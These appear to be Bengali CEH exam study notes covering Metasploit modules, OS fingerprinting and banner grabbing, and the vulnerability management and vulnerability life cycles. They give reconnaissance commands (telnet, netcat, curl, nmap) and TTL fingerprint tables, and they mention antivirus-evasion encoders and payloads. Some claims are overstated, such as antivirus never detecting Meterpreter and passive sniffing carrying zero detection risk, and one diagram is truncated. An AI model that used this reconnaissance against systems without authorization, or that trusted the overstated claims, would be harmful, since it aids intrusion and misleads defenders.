* **মূল মডিউল টাইপসমূহ:**
  1. **Exploit:** কোনো সিস্টেমের দুর্বলতাকে কাজে লাগিয়ে সিস্টেমে প্রবেশের কোড।
  2. **Payload:** এক্সপ্লয়েট সফল হওয়ার পর টার্গেট মেশিনে যে কোডটি রান হয় (যেমন: রিভার্স শেল, মিটারপ্রিটার)।
  3. **Auxiliary:** এক্সপ্লয়েট ছাড়া অন্যান্য কাজের মডিউল— যেমন পোর্ট স্ক্যানিং, স্নিফিং, ভালনারেবিলিটি চেকিং ও এনিউমারেশন।
  4. **Post:** সিস্টেমে ঢোকার পর প্রভিলেজ এস্কেলেশন, তথ্য সংগ্রহ ও লগ ক্লিয়ারিংয়ের মডিউল।
  5. **Encoder:** অ্যান্টিভাইরাস বাইপাস করার জন্য পেলোড কোডকে এনকোড/অবফাসকেট করার মডিউল (যেমন: `shikata_ga_nai`)।
  6. **NOP Generator:** বাফার ওভারফ্লোর জন্য NOP sled তৈরির মডিউল।
* **Meterpreter:** Metasploit-এর একটি অ্যাডভান্সড ডাইনামিক ইন-মেমোরি পেলোড যা কোনো হার্ডড্রাইভে ফাইল না লিখে সরাসরি র্যামে চলে, ফলে অ্যান্টিভাইরাসে ধরা পড়ে না।

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

সাইবার হামলায় টার্গেট সিস্টেমের বিরুদ্ধে সঠিক এক্সপ্লয়েট (Exploit) নির্বাচন করার জন্য আক্রমণকারী বা পেনিট্রেশন টেস্টারকে জানতে হয় টার্গেট কম্পিউটারে **কোন অপারেটিং সিস্টেম (OS)** চলছে এবং সার্ভিসে **কোন সফটওয়্যারের কোন ভার্সনটি** চালু আছে। এই তথ্য বের করার প্রক্রিয়াকে **OS Discovery** ও **Banner Grabbing** বলা হয়।

```
[ Attacker / Pentester ]
        │
        ├─── 1. Active Probing (Telnet / Netcat / curl / Nmap -sV -O) ───► [ Target Server ]
        │                                                                        │
        │◄── 2. Server Banner: "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1" ───────────┘
        │      (সরাসরি সার্ভিস ও ওএস ভার্সন প্রকাশ করে)
        │
        └─── 3. Passive Sniffing (Wireshark / p0f) ───────────────────────► [ Network Traffic ]
               (TTL = 64 ➔ Linux,  TTL = 128 ➔ Windows,  TTL = 255 ➔ Cisco)
```

## 🔍 ১. OS Discovery (অপারেটিং সিস্টেম সনাক্তকরণ)

### সংজ্ঞা (Definition)
**OS Discovery** (বা **OS Fingerprinting**) হলো একটি দূরবর্তী টার্গেট হোস্টে কোন অপারেটিং সিস্টেম (যেমন: Windows Server 2022, Ubuntu Linux, Cisco IOS, FreeBSD) এবং তার কোন কার্নেল/বিল্ড ভার্সন চলছে তা নির্দিষ্টভাবে সনাক্ত করার প্রযুক্তি।

### কেন OS Discovery অত্যন্ত গুরুত্বপূর্ণ?
1. **সঠিক এক্সপ্লয়েট নির্বাচন:** উইন্ডোজের জন্য তৈরি এক্সপ্লয়েট (যেমন: EternalBlue) লিনাক্সে কাজ করবে না। ওএস নিশ্চিত না হয়ে আক্রমণ চালালে সিস্টেম ক্র্যাশ (Blue Screen of Death / Kernel Panic) হতে পারে।
2. **আক্রমণের ক্ষেত্র নির্ধারণ:** ওএস জানার পর আক্রমণকারী বুঝতে পারেন কোন ফাইল সিস্টেম (NTFS বনাম ext4), ডিফল্ট ইউজার ডিরেক্টরি (`C:\Users\` বনাম `/home/`), এবং কমান্ড প্রম্পট (`cmd/powershell` বনাম `bash`) বিদ্যমান।

## 🏷️ ২. Banner Grabbing (ব্যানার গ্র্যাবিং)

### সংজ্ঞা (Definition)
**Banner Grabbing** (বা **OS/Service Banner Analysis**) হলো এমন একটি তথ্য সংগ্রহের কৌশল যার মাধ্যমে কোনো টার্গেট সিস্টেমের উন্মুক্ত পোর্টে সংযুক্ত হয়ে সিস্টেম বা সার্ভিস কর্তৃক প্রেরিত স্বাগত বার্তা বা হেডার তথ্য (**Banner**) সংগ্রহ ও বিশ্লেষণ করা হয়।

ব্যানার সাধারণত নিম্নলিখিত স্পর্শকাতর তথ্যগুলো প্রকাশ করে দেয়:
* সার্ভিসের নাম (যেমন: Apache, Nginx, Microsoft-IIS, OpenSSH, vsftpd)
* সফটওয়্যার ভার্সন নম্বর (যেমন: `Apache/2.4.29`, `OpenSSH 7.4p1`)
* অন্তর্নিহিত অপারেটিং সিস্টেম ও আর্কিটেকচার (যেমন: `Ubuntu 18.04.1`, `Debian`, `Win64`)
* মডিউল ও স্ক্রিপ্টিং সাপোর্ট (যেমন: `PHP/7.2.24`, `OpenSSL/1.1.1`)

EC-Council CEH স্ট্যান্ডার্ড অনুযায়ী ব্যানার গ্র্যাবিং প্রধানত দুই প্রকার:

### ক) Active Banner Grabbing (সক্রিয় ব্যানার গ্র্যাবিং)

সরাসরি টার্গেট হোস্টে কানেকশন তৈরি করে এবং রেসপন্স বিশ্লেষণ করে তথ্য সংগ্রহ করা হয়। এটি দ্রুত ও বিস্তারিত তথ্য দেয়, তবে টার্গেটের IDS/IPS এবং লগ ফাইলে সহজেই ধরা পড়ে।

#### ১. Telnet ব্যবহার করে:
```bash
telnet 192.168.1.50 80
# ইনপুট:
HEAD / HTTP/1.0
[Enter] [Enter]

# প্রাপ্ত আউটপুট (ব্যানার):
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

#### ২. Netcat (`nc`) ব্যবহার করে:
```bash
# পোর্ট ২১ (FTP)-এ ব্যানার গ্র্যাব
nc -v 192.168.1.50 21
# আউটপুট: 220 (vsFTPd 3.0.3)

# পোর্ট ২২ (SSH)-এ ব্যানার গ্র্যাব
nc -v 192.168.1.50 22
# আউটপুট: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

#### ৩. cURL কমান্ড ব্যবহার করে:
```bash
curl -I http://192.168.1.50
# আউটপুট হেডার সরাসরি সার্ভার ব্যানার প্রদর্শন করে
```

#### ৪. Nmap সার্ভিস ও ভার্সন ডিটেকশন (`-sV`):
```bash
nmap -sV -p 80,445,21,22 192.168.1.50
```

### খ) Passive Banner Grabbing (নিষ্ক্রিয় ব্যানার গ্র্যাবিং)

টার্গেটে কোনো নতুন প্যাকেট না পাঠিয়ে নেটওয়ার্কে চলাচলকারী বৈধ প্যাকেটগুলো ক্যাপচার (Sniffing) করে তথ্য বিশ্লেষণ করা হয়। এটি শতভাগ স্টিলথ (অদৃশ্য), কারণ টার্গেটের লগে আক্রমণকারীর কোনো আইপি পড়ে না।

প্যাসিভ ওএস ফিঙ্গারপ্রিন্টিং মূলত **TCP/IP হেডার বৈশিষ্ট্য** বিশ্লেষণের মাধ্যমে সম্পন্ন হয়:

#### ১. Time To Live (TTL) এবং TCP Window Size পর্যবেক্ষণ:
বিভিন্ন অপারেটিং সিস্টেমের আইপি প্যাকেটের ডিফল্ট TTL এবং উইন্ডো সাইজ ভিন্ন ভিন্ন হয়:

| অপারেটিং সিস্টেম (OS) | ডিফল্ট TTL মান (Default TTL) | TCP Window Size | ডিফল্ট DF (Don't Fragment) ফ্ল্যাগ |
|---|---|---|---|
| **Linux (Kernel 2.4 / 3.x / 4.x / 5.x)** | **64** | 5840 / 29200 | সাধারণত Set (1) |
| **Microsoft Windows (7, 10, 11, Server)** | **128** | 8192 / 65535 | সাধারণত Set (1) |
| **Cisco Routers / Network Devices** | **255** | 4128 | Not Set (0) |
| **Solaris / AIX / FreeBSD** | **255** (FreeBSD: 64) | 8760 / 16384 | ভ্যারিয়েন্ট অনুযায়ী ভিন্ন |

> 💡 **TTL রুল অফ থাম্ব:** যদি পিং বা ওয়্যারশার্কে TTL মান **৬০ থেকে ৬৪** এর মধ্যে দেখা যায়, তবে টার্গেট নিশ্চিতভাবেই **Linux/Unix**। যদি TTL মান **১১০ থেকে ১২৮** এর মধ্যে দেখা যায়, তবে টার্গেট নিশ্চিতভাবেই **Windows** (মাঝের রাউটার পার হওয়ার কারণে ১-২ মান কমে যেতে পারে)।

#### ২. প্যাসিভ টুলস:
* **Wireshark:** সিন প্যাকেট বা এইচটিটিপি রেসপন্স প্যাকেট বিশ্লেষণ।
* **p0f (Passive OS Fingerprinting tool):** কোনো প্যাকেট না পাঠিয়ে ব্যাকগ্রাউন্ডে ট্রাফিক শুনে স্বয়ংক্রিয়ভাবে ক্লায়েন্ট ও সার্ভারের ওএস, আপটাইম এবং ব্রাউজার সংস্করণ বলে দেয়।

## 🧠 ৪. Nmap কীভাবে OS ডিটেকশন করে? (TCP/IP Stack Fingerprinting)

Nmap যখন `nmap -O <target>` কমান্ড চালায়, তখন এটি টার্গেটের দিকে বিশেষভাবে তৈরি কিছু প্রোব প্যাকেট পাঠায়:

1. **FIN Probe:** একটি খোলা পোর্টে FIN ফ্ল্যাগসহ প্যাকেট পাঠায় (RFC 793 অনুযায়ী রেসপন্স করার কথা নয়, কিন্তু উইন্ডোজ ভুলভাবে RST রেসপন্স দেয়)।
2. **BOGUS Flag Probe:** TCP হেডারে অনির্ধারিত/অবৈধ ফ্ল্যাগ সেট করে পাঠায়।
3. **ISN (Initial Sequence Number) Sampling:** টিসিপি সিকোয়েন্স নম্বর তৈরির গাণিতিক প্যাটার্ন পরীক্ষা করে।
4. **TCP Options Analysis:** টার্গেট MSS, Window Scale, SACK, Timestamps সমর্থন করে কি না তা যাচাই করে।
5. **Database Comparison:** সংগৃহীত রেসপন্সগুলোর সাথে Nmap-এর হাজার হাজার ওএস সিগনেচারের ডাটাবেস (`nmap-os-db`) মিলিয়ে শতকরা ম্যাচ রেট (যেমন: `OS details: Linux 4.15 - 5.8 (98%)`) প্রদর্শন করে।

## 🛡️ ৫. কাউন্টারমেজার ও প্রতিরোধ কৌশল (Defense & Countermeasures)

প্রতিষ্ঠানকে ওএস ডিসকভারি ও ব্যানার গ্র্যাবিং আক্রমণ থেকে সুরক্ষিত রাখতে নিম্নোক্ত পদক্ষেপ গ্রহণ করতে হবে:

1. **ব্যানার গোপন বা পরিবর্তন করা (Banner Obfuscation / Suppression):**
   * **Apache:** `httpd.conf` ফাইলে কনফিগার করুন:
     ```apache
     ServerTokens Prod
     ServerSignature Off
     ```
     *(এর ফলে অ্যাপাচি কেবল `Server: Apache` দেখাবে, ওএস ও সাব-ভার্সন লুকানো থাকবে)*।
   * **Nginx:** `nginx.conf` ফাইলে কনফিগার করুন:
     ```nginx
     server_tokens off;
     ```
   * **IIS:** URL Rewrite মডিউল বা `web.config` ব্যবহার করে `Server` ও `X-Powered-By` হেডার মুছে ফেলা।

2. **TTL ভ্যালু পরিবর্তন করা:**
   * উইন্ডোজে রেজিস্ট্রি এডিট করে (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters` ➔ `DefaultTTL`) ১২৮ থেকে পরিবর্তন করে অন্য মান দেওয়া।
   * লিনাক্স ফায়ারওয়ালে iptables রুল দিয়ে ট্রাফিকের TTL পরিবর্তন করা:
     ```bash
     iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64
     ```

3. **অপ্রয়োজনীয় সার্ভিস বন্ধ করা:** সার্ভারে টেলনেট, এফটিপি, ও অপ্রয়োজনীয় পোর্টের সেবা স্থায়ীভাবে বন্ধ রাখা।

## 📊 তুলনামূলক সারসংক্ষেপ: Active বনাম Passive

| বৈশিষ্ট্যাবলী | Active Banner Grabbing | Passive Banner Grabbing |
|---|---|---|
| **টার্গেটে ট্রাফিক প্রেরণ** | হ্যাঁ, সরাসরি প্যাকেট পাঠায় | না, কেবল প্যাকেট ক্যাপচার ও মনিটর করে |
| **শনাক্ত হওয়ার ঝুঁকি** | অনেক বেশি (IDS/IPS এবং সিস্টেমে লগ তৈরি হয়) | শূন্য (সম্পূর্ণ অদৃশ্য ও প্যাসিভ) |
| **তথ্যের গভীরতা** | অত্যন্ত নিখুঁত ও বিস্তৃত সার্ভিস ভার্সন | তুলনামূলক সাধারণ (ওএস ক্যাটাগরি, সম্ভাব্য ভার্সন) |
| **প্রধান ব্যবহৃত টুলস** | Telnet, Netcat, cURL, Nmap (`-sV`, `-O`) | Wireshark, p0f, NetworkMiner |

## 🎯 পরীক্ষার জন্য বিশেষ পরামর্শ (Exam Tips)

1. **সংজ্ঞা পৃথক করুন:** OS Discovery (পুরো অপারেটিং সিস্টেম চেনা) এবং Banner Grabbing (নির্দিষ্ট সার্ভিসের ব্যানার/হেডার পড়া)—এই দুটির মধ্যকার সম্পর্ক ও পার্থক্য স্পষ্টভাবে লিখবেন।
2. **TTL টেবিল দিন:** Linux (64), Windows (128), Cisco (255)—এই তিনটি TTL ভ্যালুর টেবিল দিলে ফুল মার্কস পাওয়া নিশ্চিত হবে।
3. **প্রতিরোধ নির্দেশ করুন:** অ্যাপাচির `ServerTokens Prod` কমান্ডটি উল্লেখ করলে উত্তরটি পেশাদার মানের হয়।

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

**Vulnerability Management Life Cycle (VMLC)** হলো একটি অবিচ্ছিন্ন, পর্যায়ক্রমিক এবং প্রাতিষ্ঠানিক প্রক্রিয়া যার মাধ্যমে কোনো প্রতিষ্ঠানের নেটওয়ার্ক, সার্ভার ও সফটওয়্যারে বিদ্যমান নিরাপত্তা দুর্বলতাগুলোকে (Vulnerabilities) সনাক্ত, মূল্যায়ন, অগ্রাধিকার নির্ধারণ, সমাধান এবং পর্যবেক্ষণ করা হয়।

এটি কোনো এককালীন (One-time) কাজ নয়, বরং এটি একটি **ক্রমাগত চলমান চক্র (Continuous Cycle)**।

```
                  ┌─────────────────────────────────────────┐
```

## 🔄 ভলনারেবিলিটি ম্যানেজমেন্ট লাইফ সাইকেলের ৬টি মূল ধাপ (The 6 Phases)

EC-Council CEH v13 স্ট্যান্ডার্ড অনুযায়ী লাইফ সাইকেলের ধাপগুলো নিচে বিশদভাবে ব্যাখ্যা করা হলো:

---

### ধাপ ১: Discover (সম্পদ ও তথ্য আবিষ্কার / Asset Inventory)
* **মূল কাজ:** প্রতিষ্ঠানের নেটওয়ার্কে যুক্ত সমস্ত সক্রিয় হার্ডওয়্যার, সফটওয়্যার, অপারেটিং সিস্টেম এবং নেটওয়ার্ক পেরিমিটারের সঠিক ইনভেন্টরি বা তালিকা তৈরি করা।
* **যে তথ্য সংগ্রহ করা হয়:**
  * লাইভ আইপি অ্যাড্রেস এবং সাবনেট
  * অপারেটিং সিস্টেম ও ফার্মওয়্যার ভার্সন
  * উন্মুক্ত পোর্ট এবং রানিং সার্ভিস
  * ক্লাউড রিসোর্স, ভার্চুয়াল মেশিন ও আইওটি (IoT) ডিভাইস
* **নীতিবাক্য:** *"যা আপনি দেখতে পান না, তা আপনি সুরক্ষিত করতে পারবেন না (You cannot protect what you cannot see)।"*

---

### ধাপ ২: Prioritize Assets (সম্পদের ব্যবসায়িক অগ্রাধিকার নির্ধারণ)
* **মূল কাজ:** সংগৃহীত সম্পদগুলোকে তাদের ব্যবসায়িক গুরুত্ব (Business Criticality), সংবেদনশীলতা এবং এক্সপোজারের ভিত্তিতে শ্রেণীবদ্ধ ও অগ্রাধিকারভুক্ত করা।
* **ক্যাটাগরি বা টায়ার বিভাজন:**
  1. **Tier 1 (Mission-Critical):** পাবলিক-ফেসিং ওয়েব সার্ভার, পেমেন্ট গেটওয়ে, ডোমেন কন্ট্রোলার (DC), কাস্টমার ডাটাবেস। (সর্বোচ্চ অগ্রাধিকার)
  2. **Tier 2 (Internal Business):** অভ্যন্তরীণ ফাইল সার্ভার, ইন্ট্রানেট পোর্টাল, অ্যাকাউন্টস সফটওয়্যার।
  3. **Tier 3 (Low Impact):** টেস্টিং মেশিন, ল্যাব ডিভাইস, সাধারণ প্রিন্টার।
* **উদ্দেশ্য:** সীমিত বাজেট এবং জনবল নিয়ে প্রথমে সবচেয়ে গুরুত্বপূর্ণ সম্পদে নিরাপত্তা নিশ্চিত করা।

---

### ধাপ ৩: Assess (দুর্বলতা মূল্যায়ন / Vulnerability Assessment)
* **মূল কাজ:** স্বয়ংক্রিয় ভালনারেবিলিটি স্ক্যানার (যেমন: **Tenable Nessus**, **Qualys Guard**, **OpenVAS**, **Rapid7 Nexpose**) ব্যবহার করে অগ্রাধিকারপ্রাপ্ত সম্পদগুলোর দুর্বলতা বিশ্লেষণ করা।
* **মূল্যায়নকৃত ক্ষেত্রসমূহ:**
  * সফটওয়্যার বাগ এবং আনপ্যাচড দুর্বলতা (CVE)
  * মিসকনফিগারেশন (যেমন: ডিফল্ট পাসওয়ার্ড, ইনসিকিউর প্রোটোকল চালু থাকা)
  * অতিরিক্ত পোর্ট এবং অপ্রয়োজনীয় সার্ভিস
* **আউটপুট:** দুর্বলতাগুলোর প্রাথমিক তালিকা এবং তাদের সিভিএসএস (CVSS) স্কোর।

---

### ধাপ ৪: Remediate (প্রতিকার ও সমাধান গ্রহণ)
* **মূল কাজ:** অ্যাসেসমেন্টে চিহ্নিত দুর্বলতাগুলোকে অগ্রাধিকারের ভিত্তিতে সমাধান করা।
* **প্রতিকারের ৪টি প্রাতিষ্ঠানিক বিকল্প (The 4 Remediation Responses):**

```
┌────────────────────────────────────────────────────────────────────────┐
│                      4 Remediation Strategies                          │
├───────────────────┬────────────────────────────────────────────────────┤
│ ১. Remediation    │ দুর্বলতাটি পুরোপুরি ফিক্স করা (যেমন: সিকিউরিটি      │
│    (সরাসরি প্যাচ) │ প্যাচ ইনস্টল করা, সফটওয়্যার আপগ্রেড করা)।         │
├───────────────────┼────────────────────────────────────────────────────┤
│ ২. Mitigation     │ তাৎক্ষণিক প্যাচ না থাকলে ফায়ারওয়াল/WAF রুল বা      │
│    (ঝুঁকি প্রশমন) │ সেগমেন্টেশন দিয়ে আক্রমণ প্রতিরোধ করা।                │
├───────────────────┼────────────────────────────────────────────────────┤
│ ৩. Acceptance     │ দুর্বলতার প্রভাব অতি নগণ্য হলে এবং ফিক্সের খরচ বেশি│
│    (ঝুঁকি গ্রহণ)  │ হলে ঝুঁকিটি আনুষ্ঠানিকভাবে গ্রহণ করা (Risk Accept)। │
├───────────────────┼────────────────────────────────────────────────────┤
│ ৪. Transference   │ সাইবার ইন্স্যুরেন্স নেওয়া বা সিকিউরিটি অপারেশনের   │
│    (ঝুঁকি হস্তান্তর)│ দায়িত্ব থার্ড পার্টিকে হস্তান্তরের মাধ্যমে দায় কমানো।│
└───────────────────┴────────────────────────────────────────────────────┘
```

---

### ধাপ ৫: Verify / Rescan (যাচাইকরণ ও পুনরায় স্ক্যান)
* **মূল কাজ:** প্রতিকারমূলক পদক্ষেপ (Patch / Configuration) বাস্তবায়নের পর পুনরায় স্ক্যান (Rescan) পরিচালনা করে যাচাই করা।
* **যাচাইকরণের উদ্দেশ্য:**
  1. নিশ্চিত করা যে দুর্বলতাটি আসলেই দূর হয়েছে (CVE বন্ধ হয়েছে)।
  2. নতুন প্যাচ প্রয়োগের ফলে সিস্টেমে কোনো পার্শ্বপ্রতিক্রিয়া (Regression) বা নতুন বাগ তৈরি হয়েছে কি না তা নিশ্চিত করা।

---

### ধাপ ৬: Report (প্রতিবেদন প্রণয়ন ও পর্যবেক্ষণ)
* **মূল কাজ:** সম্পূর্ণ প্রক্রিয়ার অগ্রগতি এবং বর্তমান নিরাপত্তা অবস্থা নথিবদ্ধ করে সংশ্লিষ্টদের নিকট উপস্থাপন করা।
* **প্রতিবেদনের প্রকারভেদ:**
  * **Executive Report (নির্বাহী প্রতিবেদন):** ম্যানেজমেন্ট ও সি-লেভেল কর্মকর্তাদের জন্য উচ্চ-স্তরের গ্রাফিকাল সামারি (কত শতাংশ ঝুঁকি কমল, কমপ্লায়েন্স স্ট্যাটাস)।
  * **Technical / Remediation Report (কারিগরি প্রতিবেদন):** সিস্টেম অ্যাডমিন এবং সিকিউরিটি ইঞ্জিনিয়ারদের জন্য সুনির্দিষ্ট আইপি, পোর্ট, সিভেই কোড এবং প্যাচিং গাইডলাইন।

## 📊 Vulnerability Assessment বনাম Vulnerability Management

শিক্ষার্থীদের প্রায়ই এই দুটি ধারণায় বিভ্রান্তি ঘটে। পরীক্ষায় এই পার্থক্যটি অত্যন্ত গুরুত্বপূর্ণ:

| মানদণ্ড | Vulnerability Assessment (VA) | Vulnerability Management (VM) |
|---|---|---|
| **সংজ্ঞা** | দুর্বলতা খোঁজার একটি নির্দিষ্ট এককালীন স্ক্যান ও তালিকা তৈরি। | দুর্বলতা খোঁজা থেকে শুরু করে প্রতিকার ও অডিট পর্যন্ত সম্পূর্ণ প্রাতিষ্ঠানিক জীবনচক্র। |
| **প্রকৃতি** | এককালীন বা সাময়িক (Point-in-time snapshot)। | অবিচ্ছিন্ন এবং চলমান প্রক্রিয়া (Continuous Lifecycle)। |
| **পরিধি** | কেবল দুর্বলতা চিহ্নিত ও রিপোর্ট তৈরিতে সীমাবদ্ধ। | অ্যাসেট ইনভেন্টরি, প্রায়োরিটাইজেশন, প্যাচিং, ভেরিফিকেশন ও পলিসি নিয়ন্ত্রণ অন্তর্ভুক্ত। |
| **দায়িত্ব** | মূলত সিকিউরিটি অডিটর বা স্ক্যানিং টুল দ্বারা পরিচালিত। | ক্রস-ফাংশনাল টিম (Security, IT Ops, DevOps, Management) দ্বারা যৌথভাবে পরিচালিত। |

## 🎯 পরীক্ষার জন্য বিশেষ পরামর্শ (Exam Tips)

1. **ধারাবাহিকতা বজায় রাখুন:** ৬টি ধাপের নাম ক্রমানুসারে লিখবেন: **Discover ➔ Prioritize Assets ➔ Assess ➔ Remediate ➔ Verify ➔ Report**।
2. **৪টি প্রতিকার কৌশল উল্লেখ করুন:** Remediate ধাপে **Remediation, Mitigation, Acceptance, Transference**—এই ৪টি স্ট্র্যাটেজি লিখলে শিক্ষক পুরো মার্কস দেন।
3. **VA বনাম VM পার্থক্য:** উত্তরের শেষে এই তুলনামূলক টেবিলটি যুক্ত করলে আপনার উত্তরটি অন্য শিক্ষার্থীদের চেয়ে স্পষ্টভাবেই আলাদা ও সেরা হবে।

## 📌 সংক্ষেপে মূল ধারণা (At a Glance)

কোনো সফটওয়্যারে কোডিংয়ের ভুল থেকে শুরু করে হ্যাকারদের দ্বারা আক্রমণ এবং ভেন্ডরের প্যাচ রিলিজ পর্যন্ত সম্পূর্ণ পর্যায়ক্রমিক রূপান্তরকে **Vulnerability Life Cycle (দুর্বলতার জীবনচক্র)** বলা হয়।

অপরদিকে, নতুন আবিষ্কৃত এসব ত্রুটি সম্পর্কে অবিচ্ছিন্ন তথ্য সংগ্রহ, বিশ্লেষণ ও প্রতিরক্ষা ব্যবস্থা হালনাগাদ করার প্রাতিষ্ঠানিক প্রক্রিয়াকে **Vulnerability Research (দুর্বলতা গবেষণা)** বলে।

```
[ Phase 1: Creation ]      ➔ ডেভেলপার অজান্তে সফটওয়্যারে ত্রুটি (Bug) রেখে দেন।
         │
         ▼
[ Phase 2: Discovery ]     ➔ গবেষক বা আক্রমণকারী দুর্বলতাটি খুঁজে বের করেন।
         │
         ▼
[ Phase 3: Disclosure ]    ➔ ত্রুটি ভেন্ডরকে জানানো হয় অথবা ইন্টারনেটে ফাঁস হয় (0-Day)।
         │
         ▼
[ Phase 4: Patch Dev ]     ➔ ভেন্ডর দুর্বলতা ফিক্স করে সিকিউরিটি প্যাচ তৈরি করে।
         │
         ▼
[ Phase 5: Deployment ]    ➔ ব্যবহারকারীরা প্যাচ ইনস্টল করেন; হ্যাকাররা 1-Day আক্রমণ চালায়।
```

## 🔄 ১. Vulnerability Life Cycle (দুর্বলতার জীবনচক্র)

EC-Council CEH স্ট্যান্ডার্ড অনুযায়ী একটি দুর্বলতা সাধারণত নিম্নলিখিত পর্যায়গুলোর মধ্য দিয়ে অতিক্রম করে:

---

### পর্যায় ১: Creation (দুর্বলতার উৎপত্তি)
* **বর্ণনা:** সফটওয়্যার ডিজাইন, কোডিং বা আর্কিটেকচার তৈরির সময় ডেভেলপারদের অসাবধানতা, অপর্যাপ্ত ইনপুট ভ্যালিডেশন বা সিস্টেম মিসকনফিগারেশনের কারণে দুর্বলতা সিস্টেমে প্রবেশ করে।
* **উদাহরণ:** কোনো ওয়েব ডেভেলপার ইউজার ইনপুট স্যানিটাইজ না করে সরাসরি SQL কুয়েরিতে ব্যবহার করলে SQL Injection ত্রুটির জন্ম হয়।

---

### পর্যায় ২: Discovery (দুর্বলতা আবিষ্কার)
* **বর্ণনা:** সফটওয়্যার রিলিজের পর কোনো নিরাপত্তা গবেষক (White Hat), বাগ বাউন্টি হান্টার অথবা ক্ষতিকর হ্যাকার (Black Hat) কোড অডিট, ফাজিং (Fuzzing) বা রিভার্স ইঞ্জিনিয়ারিংয়ের মাধ্যমে ত্রুটিটি খুঁজে পান।
* **জিরো-ডে অবস্থা (0-Day Phase):** এই সময় দুর্বলতা সম্পর্কে সাধারণ মানুষ বা ভেন্ডর কেউই অবগত থাকে না। যদি কোনো ব্ল্যাক হ্যাট এটি আগে খুঁজে পায়, তবে এটি অত্যন্ত বিপজ্জনক রূপ ধারণ করে।

---

### পর্যায় ৩: Disclosure (প্রকাশ বা রিপোর্ট করা)
দুর্বলতা খুঁজে পাওয়ার পর গবেষক তা কীভাবে প্রকাশ করেন তার উপর ভিত্তি করে ডিসক্লোজার ৩ প্রকার হতে পারে:
1. **Responsible / Coordinated Disclosure (দায়িত্বশীল প্রকাশ):** গবেষক সরাসরি সংশ্লিষ্ট ভেন্ডরকে গোপনে বিস্তারিত জানান এবং প্যাচ তৈরি করার জন্য যুক্তিসঙ্গত সময় (যেমন: ৬০ বা ৯০ দিন) দেন।
2. **Full Disclosure (উন্মুক্ত প্রকাশ):** ভেন্ডরকে না জানিয়ে বা কোনো সতর্কতা ছাড়াই ইন্টারনেটে (যেমন: Full Disclosure মেলিং লিস্টে) প্রকাশ করে দেওয়া।
3. **Zero-Day Sale (ডার্ক ওয়েব বিক্রয়):** অপরাধীরা ত্রুটি গোপন রেখে ব্ল্যাক মার্কেটে কোটি টাকায় বিক্রি করে গুপ্তচরবৃত্তি বা ম্যালওয়্যারের জন্য।

---

### পর্যায় ৪: Mitigation & Patch Development (প্যাচ বা ফিক্স তৈরি)
* **বর্ণনা:** ভেন্ডর দুর্বলতার সত্যতা নিশ্চিত করে এবং কোড পরিবর্তন করে একটি সিকিউরিটি প্যাচ (Security Patch) বা আপডেট তৈরি করে।
* **অস্থায়ী সমাধান (Workaround):** প্যাচ রিলিজ হতে দেরি হলে ভেন্ডর তাৎক্ষণিক একটি ওয়ার্কঅ্যারাউন্ড দেয় (যেমন: পোর্ট বন্ধ রাখা বা রেজিস্ট্রি কি ডিজেবল করা)।

---

### পর্যায় ৫: Patch Release, Deployment & Exploitation (রিলিজ ও আক্রমণ)
* **বর্ণনা:** ভেন্ডর আনুষ্ঠানিকভাবে প্যাচ ও সিকিউরিটি বুলেটিন রিলিজ করে এবং ব্যবহারকারীদের আপডেট করার আহ্বান জানায়।
* **১-ডে প্যারাডক্স (1-Day Paradox):** প্যাচ রিলিজ হওয়ার পর আক্রমণকারীরা প্যাচ ফাইলটি রিভার্স ইঞ্জিনিয়ারিং করে খুব সহজেই দুর্বলতার মূল কারণ জেনে ফেলে। যেসকল প্রতিষ্ঠান দ্রুত প্যাচ ইনস্টল করে না, তাদের সিস্টেমে ব্যাপক **1-Day Attack** বা N-Day আক্রমণ চালানো হয়।

---

### ⏱️ 0-Day বনাম 1-Day বনাম N-Day ভালনারেবিলিটি

| পরিভাষা | সংজ্ঞা ও অবস্থা | ঝুঁকি মাত্রা | প্রতিরোধ কৌশল |
|---|---|---|---|
| **0-Day Vulnerability** | দুর্বলতাটি জনসমক্ষে বা ভেন্ডরের কাছে অজানা; এর কোনো অফিসিয়াল প্যাচ নেই। | **সর্বোচ্চ (Extreme)** | বিহেভিয়ারাল ডিটেকশন, EDR, নেটওয়ার্ক সেগমেন্টেশন, Zero-Trust |
| **1-Day Vulnerability** | ভেন্ডর সবেমাত্র প্যাচ রিলিজ করেছে; কিন্তু ব্যবহারকারীরা এখনও ইনস্টল করেনি। | **অত্যন্ত উচ্চ (Critical)** | জরুরি ভিত্তিতে প্যাচ টেস্ট ও পুশ করা (Emergency Patching) |
| **N-Day Vulnerability** | প্যাচ রিলিজের কয়েক মাস/বছর পার হয়েছে, কিন্তু অলসতার কারণে আনপ্যাচড রয়ে গেছে। | **উচ্চ (High)** | রুটিন ভালনারেবিলিটি স্ক্যান ও সেন্ট্রালাইজড প্যাচ ম্যানেজমেন্ট |

## 🔬 ২. Vulnerability Research (দুর্বলতা সংক্রান্ত গবেষণা)

### সংজ্ঞা (Definition)
**Vulnerability Research** হলো এমন একটি বিজ্ঞানসম্মত ও পদ্ধতিগত প্রক্রিয়া যার মাধ্যমে নিরাপত্তা গবেষক ও এথিক্যাল হ্যাকাররা সফটওয়্যার, হার্ডওয়্যার, নেটওয়ার্ক প্রোটোকল ও অপারেটিং সিস্টেমের নিরাপত্তা ত্রুটিগুলো নিরবচ্ছিন্নভাবে বিশ্লেষণ, পর্যবেক্ষণ, সনাক্ত এবং নথিভুক্ত করেন।

---

### 🎯 কেন Vulnerability Research প্রয়োজন? (Objectives)

1. **আক্রমণকারীর চেয়ে এক ধাপ এগিয়ে থাকা:** আক্রমণকারীরা দুর্বলতা কাজে লাগানোর আগেই তার তথ্য বের করে সিস্টেমে প্রিভেন্টিভ মেজারমেন্ট প্রয়োগ করা।
2. **ফলস পজিটিভ যাচাই:** ভালনারেবিলিটি স্ক্যানারের রিপোর্ট করা বাগগুলো আসলেই এক্সপ্লয়েটেবল কি না তা গবেষণার মাধ্যমে নিশ্চিত করা।
